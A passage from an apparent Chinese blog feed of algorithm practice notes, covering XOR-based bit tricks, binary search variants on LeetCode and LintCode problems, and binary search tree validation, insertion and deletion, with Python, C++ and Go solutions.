<p><strong>加法</strong></p>
<p>a+b=n+c=sum</p>
<p>n+c可以进一步递归，直到c为0时，返回n</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>a=0^a = a^0</p>
<p>0=a ^ a</p>
<p>由上面两个推导出：a=a^ b ^b</p>
<h1 id="没有加减乘除的加法"><a href="#没有加减乘除的加法" class="headerlink" title="没有加减乘除的加法"></a>没有加减乘除的加法</h1><p>python写这道题有些复杂</p>
<p><img src="/2020/08/02/2020-08-02-Binary-1/image-20200730190241516.png" alt="image-20200730190241516"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, a: int, b: int)</span> -&gt; int:</span></span><br><span class="line">        x=<span class="number">0xffffffff</span></span><br><span class="line">        a,b=a&amp;x,b&amp;x <span class="comment">#取32位以内的二进制</span></span><br><span class="line">        <span class="keyword">while</span> b!=<span class="number">0</span>:</span><br><span class="line">            a,b=(a^b),(a&amp;b)&lt;&lt;<span class="number">1</span>&amp;x</span><br><span class="line">        <span class="keyword">return</span> a <span class="keyword">if</span> a&lt;=<span class="number">0x7fffffff</span> <span class="keyword">else</span> ~(a^x) <span class="comment">#若补码 aa 为负数,需要还原将32位以上取反</span></span><br></pre></td></tr></table></figure>

<p>更推荐用C / C++ / JAVA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b == <span class="number">0</span> ? a : add((a ^ b),(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a &amp; b) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="只出现一次的数"><a href="#只出现一次的数" class="headerlink" title="只出现一次的数"></a>只出现一次的数</h1><pre><code>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</code></pre><p>说明：</p>
<p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<p><strong>示例 :</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>

<p>用的定律就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumber</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        result=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            result^=num</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 二分搜索练习</title>
    <url>/2020/08/02/2020-08-02-Binary-Search-1/</url>
    <content><![CDATA[<p><img src="/2020/08/02/2020-08-02-Binary-Search-1/image-20200801203404830.png" alt="image-20200801203404830"></p>
<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p><a href="https://leetcode-cn.com/problems/binary-search/" target="_blank" rel="noopener">二分查找</a></p>
<p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p>
<p>使用了模板3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; int:</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(end+start)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]==target: <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid]&lt;target: start=mid</span><br><span class="line">            <span class="keyword">else</span>: end=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]==target: <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">if</span> nums[end]==target: <span class="keyword">return</span> end</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>

<h1 id="搜索区间-LintCode"><a href="#搜索区间-LintCode" class="headerlink" title="搜索区间 LintCode"></a>搜索区间 <code>LintCode</code></h1><p>给定一个包含 <em>n</em> 个整数的排序数组，找出给定目标值 <em>target</em> 的起始和结束位置。</p>
<p>如果目标值不在数组中，则返回<code>[-1, -1]</code></p>
<p>思路：</p>
<ul>
<li>用模板三</li>
<li>先用二分搜索，搜第一次出现的</li>
<li>再二分搜索，搜最后一次出现的</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchRange</span> <span class="params">(A []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(A) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> []<span class="keyword">int</span>&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line">    start := <span class="number">0</span></span><br><span class="line">    end := <span class="built_in">len</span>(A) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> start+<span class="number">1</span> &lt; end &#123;</span><br><span class="line">        mid := start + (end-start)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> A[mid] &gt; target &#123;</span><br><span class="line">            end = mid</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> A[mid] &lt; target &#123;</span><br><span class="line">            start = mid</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果相等，应该继续向左找，就能找到第一个目标值的位置</span></span><br><span class="line">            end = mid</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 搜索左边的索引</span></span><br><span class="line">    <span class="keyword">if</span> A[start] == target &#123;</span><br><span class="line">        result[<span class="number">0</span>] = start</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> A[end] == target &#123;</span><br><span class="line">        result[<span class="number">0</span>] = end</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result[<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">        result[<span class="number">1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="built_in">len</span>(A) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> start+<span class="number">1</span> &lt; end &#123;</span><br><span class="line">        mid := start + (end-start)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> A[mid] &gt; target &#123;</span><br><span class="line">            end = mid</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> A[mid] &lt; target &#123;</span><br><span class="line">            start = mid</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果相等，应该继续向右找，就能找到最后一个目标值的位置</span></span><br><span class="line">            start = mid</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 搜索右边的索引</span></span><br><span class="line">    <span class="keyword">if</span> A[end] == target &#123;</span><br><span class="line">        result[<span class="number">1</span>] = end</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> A[start] == target &#123;</span><br><span class="line">        result[<span class="number">1</span>] = start</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result[<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">        result[<span class="number">1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="搜索插入位置"><a href="#搜索插入位置" class="headerlink" title="搜索插入位置"></a>搜索插入位置</h1><p>主要思路：</p>
<ul>
<li>依旧是用模板3</li>
<li>题目其实是找第一个能插入的位置，所以有相同的值的话，需要插在这个值的第一个出现的位置</li>
<li>如果没有相同值，就按情况找start、end、end+1其中的一个返回即可</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&gt;target: end=mid</span><br><span class="line">            <span class="keyword">else</span>: start=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]&lt;target <span class="keyword">and</span> nums[end]&lt;target: <span class="keyword">return</span> end+<span class="number">1</span> <span class="comment">#target比s\e都大</span></span><br><span class="line">        <span class="keyword">if</span> nums[start]&gt;=target <span class="keyword">and</span> nums[end]&gt;target: <span class="keyword">return</span> start <span class="comment">#target应该放在s处</span></span><br><span class="line">        <span class="keyword">return</span> end <span class="comment">#应该放在中间</span></span><br></pre></td></tr></table></figure>

<h1 id="搜索二维矩阵"><a href="#搜索二维矩阵" class="headerlink" title="搜索二维矩阵"></a>搜索二维矩阵</h1><p>很简单的思路</p>
<ul>
<li>把二维化为一维</li>
<li>再二分搜索（可以用模板1、也可以用模板3）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMatrix</span><span class="params">(self, matrix: List[List[int]], target: int)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> len(matrix)==<span class="number">0</span> <span class="keyword">or</span> len(matrix[<span class="number">0</span>])==<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        matrixN=len(matrix)</span><br><span class="line">        matrixM=len(matrix[<span class="number">0</span>])</span><br><span class="line">        search=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(matrixN*matrixM)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(matrixN):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(matrixM):</span><br><span class="line">                search[i*matrixM+j]=matrix[i][j]</span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(search)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start&lt;=end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="comment"># print(search[mid])</span></span><br><span class="line">            <span class="keyword">if</span> search[mid]==target: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> search[mid]&gt;target: end=mid<span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>: start=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h1 id="第一个错误的版本号"><a href="#第一个错误的版本号" class="headerlink" title="第一个错误的版本号"></a>第一个错误的版本号</h1><p>仍然是用模板3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The isBadVersion API is already defined for you.</span></span><br><span class="line"><span class="comment"># @param version, an integer</span></span><br><span class="line"><span class="comment"># @return a bool</span></span><br><span class="line"><span class="comment"># def isBadVersion(version):</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">firstBadVersion</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        start=<span class="number">1</span></span><br><span class="line">        end=n</span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> isBadVersion(mid)==<span class="literal">True</span>: end=mid</span><br><span class="line">            <span class="keyword">else</span>: start=mid</span><br><span class="line">        <span class="keyword">if</span> isBadVersion(start): <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">return</span> end</span><br></pre></td></tr></table></figure>

<h1 id="搜索旋转排序数组最小值"><a href="#搜索旋转排序数组最小值" class="headerlink" title="搜索旋转排序数组最小值"></a>搜索旋转排序数组最小值</h1><p><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/" target="_blank" rel="noopener">寻找旋转排序数组中的最小值</a></p>
<p><img src="/2020/08/02/2020-08-02-Binary-Search-1/image-20200801182956889.png" alt="image-20200801182956889"></p>
<p>思路如上，主要是要用nums[end]这个分界点来做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMin</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        target=nums[end]</span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&lt;=target: end=mid</span><br><span class="line">            <span class="keyword">else</span>: start=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]&lt;nums[end]: <span class="keyword">return</span> nums[start]</span><br><span class="line">        <span class="keyword">return</span> nums[end]</span><br><span class="line"><span class="comment"># 其实不用设target</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMin</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="comment"># target=nums[end] &lt;--删掉</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&lt;=nums[end]: end=mid &lt;--nums[end]作比较，看mid落在哪里</span><br><span class="line">            <span class="keyword">else</span>: start=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]&lt;nums[end]: <span class="keyword">return</span> nums[start]</span><br><span class="line">        <span class="keyword">return</span> nums[end]</span><br></pre></td></tr></table></figure>

<h1 id="搜索旋转排序数组最小值-ii-有重复元素"><a href="#搜索旋转排序数组最小值-ii-有重复元素" class="headerlink" title="搜索旋转排序数组最小值-ii(有重复元素)"></a>搜索旋转排序数组最小值-ii(有重复元素)</h1><p><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/" target="_blank" rel="noopener">寻找旋转排序数组中的最小值 II</a></p>
<p>比之前的题多了一个跳过重复元素的操作</p>
<p><code>while start+1&lt;end and nums[end]==nums[end-1]: end-=1 #重点，要跳过重复的元素</code><br><code>while start+1&lt;end and nums[start]==nums[start+1]: start+=1</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMin</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            <span class="keyword">while</span> start+<span class="number">1</span>&lt;end <span class="keyword">and</span> nums[end]==nums[end<span class="number">-1</span>]: end-=<span class="number">1</span> <span class="comment">#重点，要跳过重复的元素</span></span><br><span class="line">            <span class="keyword">while</span> start+<span class="number">1</span>&lt;end <span class="keyword">and</span> nums[start]==nums[start+<span class="number">1</span>]: start+=<span class="number">1</span></span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&lt;=nums[end]: end=mid</span><br><span class="line">            <span class="keyword">else</span>: start=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]&lt;nums[end]: <span class="keyword">return</span> nums[start]</span><br><span class="line">        <span class="keyword">return</span> nums[end]</span><br></pre></td></tr></table></figure>

<h1 id="搜索旋转排序数组中某个值"><a href="#搜索旋转排序数组中某个值" class="headerlink" title="搜索旋转排序数组中某个值"></a>搜索旋转排序数组中某个值</h1><p>主要是要对两条线的，start\mid\end的四种情况有分析</p>
<ul>
<li>相等直接返回</li>
<li>如果左半部分是连续的<ul>
<li>如果target是在左半部分内的，往左缩圈</li>
<li>如果target不在，往右缩圈</li>
</ul>
</li>
<li>如果右半部分是连续的<ul>
<li>如果target是在右半部分内，往右缩圈</li>
<li>如果target不在，往左缩圈</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]==target: <span class="keyword">return</span> mid <span class="comment">#相等直接返回</span></span><br><span class="line">            <span class="keyword">elif</span> nums[mid]&gt;nums[start]: <span class="comment">#如果左半部分是连续的</span></span><br><span class="line">                <span class="keyword">if</span> nums[mid]&gt;target <span class="keyword">and</span> nums[start]&lt;=target: end=mid  <span class="comment">#如果target是在左半部分内的</span></span><br><span class="line">                <span class="keyword">else</span>: start=mid</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#nums[mid]&lt;nums[end] #如果右半部分是连续的</span></span><br><span class="line">                <span class="keyword">if</span> nums[mid]&lt;target <span class="keyword">and</span> nums[end]&gt;=target: start=mid <span class="comment">#如果target是在右半部分内的</span></span><br><span class="line">                <span class="keyword">else</span>: end=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]==target: <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">if</span> nums[end]==target: <span class="keyword">return</span> end</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>

<h1 id="搜索旋转排序数组中某个值-ii"><a href="#搜索旋转排序数组中某个值-ii" class="headerlink" title="搜索旋转排序数组中某个值-ii"></a>搜索旋转排序数组中某个值-ii</h1><p><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/" target="_blank" rel="noopener">搜索旋转排序数组 II</a></p>
<ul>
<li><p>跳过重复元素</p>
</li>
<li><p>算mid值</p>
</li>
<li><p>对两条线的，start\mid\end的四种情况有分析</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> start+<span class="number">1</span>&lt;end:</span><br><span class="line">            <span class="keyword">while</span> start&lt;end <span class="keyword">and</span> nums[start]==nums[start+<span class="number">1</span>]: start+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> start&lt;end <span class="keyword">and</span> nums[end]==nums[end<span class="number">-1</span>]: end-=<span class="number">1</span></span><br><span class="line">            mid=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]==target: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> nums[start]&lt;=nums[mid]:</span><br><span class="line">                <span class="keyword">if</span> nums[start]&lt;=target <span class="keyword">and</span> target&lt;nums[mid]:end=mid</span><br><span class="line">                <span class="keyword">else</span>: start=mid</span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                <span class="keyword">if</span> nums[mid]&lt;target <span class="keyword">and</span>  target&lt;=nums[end]: start=mid</span><br><span class="line">                <span class="keyword">else</span>: end=mid</span><br><span class="line">        <span class="keyword">if</span> nums[start]==target <span class="keyword">or</span> nums[end]==target: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 二叉搜索树练习</title>
    <url>/2020/08/02/2020-08-02-Binary-Search-Tree-1/</url>
    <content><![CDATA[<h1 id="二叉搜索树的检查"><a href="#二叉搜索树的检查" class="headerlink" title="二叉搜索树的检查"></a>二叉搜索树的检查</h1><p>三种方法：</p>
<ul>
<li>递归DFS中序遍历进行<ul>
<li>得到结果res，检查 <code>res.sort()==res and len(set(res))==len(res)</code> </li>
<li>保证中序结果是排好序的，并且没有重复值</li>
</ul>
</li>
<li>迭代中序DFS遍历进行，在迭代中检测 <code>pre&lt;current.val</code></li>
<li>递归中序DFS遍历进行，如下，每次都要带入<code>maxV,minV</code> 两个参数往下走</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"><span class="comment">#用递归法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidBST</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">return</span> self.dfs(root,float(<span class="string">"inf"</span>),float(<span class="string">"-inf"</span>))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(self,root,maxV,minV)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> root.val&gt;=maxV <span class="keyword">or</span> root.val&lt;=minV:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        left=self.dfs(root.left,root.val,minV) </span><br><span class="line">        right=self.dfs(root.right,maxV,root.val)</span><br><span class="line">        <span class="keyword">return</span> left <span class="keyword">and</span> right</span><br></pre></td></tr></table></figure>

<h1 id="二叉搜索树的插入新节点"><a href="#二叉搜索树的插入新节点" class="headerlink" title="二叉搜索树的插入新节点"></a>二叉搜索树的插入新节点</h1><p>思路：</p>
<p>总有一个NULL节点放新的val节点</p>
<p>所以只要看val与root.val的大小关系，然后选左右子树递归插入就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insertIntoBST</span><span class="params">(self, root: TreeNode, val: int)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> TreeNode(val)</span><br><span class="line">        <span class="keyword">if</span> root.val&gt;val: root.left=self.insertIntoBST(root.left,val)</span><br><span class="line">        <span class="keyword">else</span>: root.right=self.insertIntoBST(root.right,val)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>

<h1 id="二叉搜索树的删除节点"><a href="#二叉搜索树的删除节点" class="headerlink" title="二叉搜索树的删除节点"></a>二叉搜索树的删除节点</h1><p><a href="https://leetcode-cn.com/problems/delete-node-in-a-bst/" target="_blank" rel="noopener">450. 删除二叉搜索树中的节点</a></p>
<p>主要是各种情况的判断：</p>
<ul>
<li>root为空，直接返回root</li>
<li>root节点值小于key</li>
<li>root节点值大于key</li>
<li>root节点值等同key<ul>
<li>右子树为空</li>
<li>左子树为空</li>
<li>左右子树都不为空<ul>
<li>找到右子树的最小值\最左的节点，把左子树接到右子树上</li>
</ul>
</li>
<li>都为空的情况没有考虑。。。。。。。。（但是测试例子没有这种例子）</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteNode</span><span class="params">(self, root: TreeNode, key: int)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">if</span> root.val&lt;key:  <span class="comment">#root节点值小于key</span></span><br><span class="line">            root.right=self.deleteNode(root.right,key)</span><br><span class="line">        <span class="keyword">elif</span> root.val&gt;key: <span class="comment">#root节点值大于key</span></span><br><span class="line">            root.left=self.deleteNode(root.left,key)</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment">#root节点值等同key</span></span><br><span class="line">            <span class="keyword">if</span> root.right==<span class="literal">None</span>: <span class="keyword">return</span> root.left</span><br><span class="line">            <span class="keyword">elif</span> root.left==<span class="literal">None</span>: <span class="keyword">return</span> root.right</span><br><span class="line">            <span class="keyword">else</span>: <span class="comment">#左右子树都不为空。都为空的情况没有考虑。。。。。。。。</span></span><br><span class="line">                curNode=root.right</span><br><span class="line">                <span class="keyword">while</span> curNode.left!=<span class="literal">None</span>: <span class="comment">#找到右子树的最小值</span></span><br><span class="line">                    curNode=curNode.left</span><br><span class="line">                curNode.left=root.left <span class="comment">#把左子树接到右子树上</span></span><br><span class="line">                root=root.right</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



